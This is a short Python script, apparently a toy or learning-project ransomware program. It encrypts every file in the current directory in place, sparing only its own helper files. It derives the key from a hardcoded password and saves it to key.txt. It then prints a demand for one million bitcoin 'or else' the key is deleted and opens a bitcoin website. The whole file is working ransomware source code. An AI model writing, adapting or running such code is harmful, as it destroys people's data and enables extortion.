import os
from os.path import isdir
import webbrowser
from utilities import generate_key, encrypt


files = []


for file in os.listdir():
    # avoid locking ourselves out of programming
    # WARNING: DO NOT REMOVE THESE
    if (
        file == "decrypt.py"
        or file == "encrypt.py"
        or file == "utilities.py"
        or file == "key.txt"
        or file == "README.md"
        or file == ".gitignore"
    ):
        continue
    # only files not directories
    # TODO: if we want to lock out ALL the files,
    # maybe we can do a recursive function
    # if os.path.isdir(file):
    #    deleteFileInDir(file) # rename to something like path
    if os.path.isfile(file):
        files.append(file)

# def gather_files():
#
#     for file in os.listdir():
#         # avoid locking ourselves out of programming
#         # WARNING: DO NOT REMOVE THESE
#         if (
#             file == "decrypt.py"
#             or file == "encrypt.py"
#             or file == "utilities.py"
#             or file == "key.txt"
#             or file == "README.md"
#             or file == ".gitignore"
#         ):
#             continue
#         # only files not directories
#         # TODO: if we want to lock out ALL the files,
#         # maybe we can do a recursive function
#         # if os.path.isdir(file):
#         #    deleteFileInDir(file) # rename to something like path
#         if os.path.isfile(file):
#             files.append(file)
#         if os.path.isdir(file):
#             return


print(files)

# i am not sure why we need the password honestly
password = b"no_hope123"
salt = os.urandom(16)
secret_key = generate_key(password, salt)

# save password to a file for now
# TODO: how can we save this somewhere more 'legit'?
with open("key.txt", "wb") as key_file:
    key_file.write(salt + secret_key)

# encrypt
for file in files:
    with open(file, "rb") as _file:
        contents = _file.read()

    enc_content = encrypt(secret_key, contents)

    # Write the e
    with open(file, "wb") as _file:
        _file.write(enc_content)

print("Give me one million bitcoin OR ELSE I WILL DELETE THE KEY FOREVER")
print(secret_key)
webbrowser.open("www.bitcoin.com")
